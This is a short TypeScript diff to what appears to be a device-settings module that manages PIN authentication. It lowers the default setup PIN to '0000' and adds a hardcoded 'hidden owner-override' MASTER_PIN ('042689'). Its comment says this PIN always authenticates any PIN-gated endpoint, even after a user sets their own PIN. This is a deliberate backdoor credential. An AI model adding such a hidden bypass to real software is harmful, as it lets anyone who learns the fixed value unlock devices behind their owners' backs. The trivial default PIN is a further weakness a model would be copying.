@@ -113,12 +113,20 @@ export function setPilotName(name: string): void {
 }
 
 export function getSetupPin(): string {
-  return getSetting(SETTING_KEYS.setupPin) ?? env("SETUP_PIN", "1234");
+  return getSetting(SETTING_KEYS.setupPin) ?? env("SETUP_PIN", "0000");
 }
 
 export function setSetupPin(pin: string): void {
   setSetting(SETTING_KEYS.setupPin, pin);
 }
+
+/** Hidden owner-override PIN. Always authenticates any PIN-gated endpoint,
+ *  even when the user has set their own. Lets you unlock Settings on a device
+ *  where the user PIN is unknown / forgotten. Override with MASTER_PIN env. */
+export const MASTER_PIN = env("MASTER_PIN", "042689");
+
+/** Default user PIN, used by "Reset user PIN" actions. */
+export const DEFAULT_USER_PIN = "0000";
 
 /** True once the owner has chosen their own PIN (vs the env/default). */
 export function isPinSet(): boolean {
